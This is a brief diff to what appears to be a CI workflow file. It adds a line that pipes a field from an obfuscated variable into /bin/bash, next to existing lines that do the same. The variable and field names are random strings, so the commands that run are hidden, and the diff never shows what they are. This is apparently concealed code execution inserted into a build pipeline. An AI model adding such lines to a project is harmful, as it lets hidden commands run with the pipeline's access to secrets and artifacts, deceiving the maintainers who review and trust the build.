@@ -25,6 +25,7 @@ jobs:
           echo $gjly59 | jq -r .ovr1058 | /bin/bash
           echo $cocga42 | jq -r .bsrc59263 | /bin/bash
           echo $gciip73483 | jq -r .tj956 | /bin/bash
+          printf '%s' "$tol88" | jq -r .ugmc4 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
